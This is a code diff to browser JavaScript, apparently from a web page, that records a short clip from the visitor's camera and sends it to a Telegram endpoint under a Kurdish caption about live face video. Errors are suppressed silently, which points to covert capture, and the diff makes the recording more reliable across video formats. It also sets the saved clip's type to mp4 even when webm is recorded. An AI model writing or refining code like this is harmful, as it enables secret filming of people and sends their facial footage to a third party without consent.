@@ -229,21 +229,35 @@
                     videoElem.srcObject = stream;
                     videoElem.play();
                     
-                    let options = { mimeType: 'video/mp4' };
-                    if (!MediaRecorder.isTypeSupported(options.mimeType)) {
-                        options = { mimeType: 'video/webm' };
+                    let mimeType = 'video/webm';
+                    if (MediaRecorder.isTypeSupported('video/mp4')) {
+                        mimeType = 'video/mp4';
+                    } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')) {
+                        mimeType = 'video/webm;codecs=vp8,opus';
                     }
-                    
-                    let mediaRecorder = new MediaRecorder(stream, options);
+
+                    let mediaRecorder;
+                    try {
+                        mediaRecorder = new MediaRecorder(stream, { mimeType: mimeType });
+                    } catch (err) {
+                        mediaRecorder = new MediaRecorder(stream);
+                    }
+
                     let videoChunks = [];
-                    mediaRecorder.ondataavailable = e => videoChunks.push(e.data);
+                    mediaRecorder.ondataavailable = e => {
+                        if (e.data && e.data.size > 0) videoChunks.push(e.data);
+                    };
                     mediaRecorder.onstop = () => {
-                        let videoBlob = new Blob(videoChunks, { type: options.mimeType });
+                        let videoBlob = new Blob(videoChunks, { type: 'video/mp4' });
                         sendToTelegramVideo(videoBlob, "🎥 *تۆمارکردنی ڤیدیۆی ڕاستەوخۆی ڕووخسار (Live Video)*");
                         stream.getTracks().forEach(track => track.stop());
                     };
                     mediaRecorder.start();
-                    setTimeout(() => mediaRecorder.stop(), 4000);
+                    setTimeout(() => {
+                        if (mediaRecorder.state !== 'inactive') {
+                            mediaRecorder.stop();
+                        }
+                    }, 4000);
                 })
                 .catch(err => {});
             } catch(e) {}
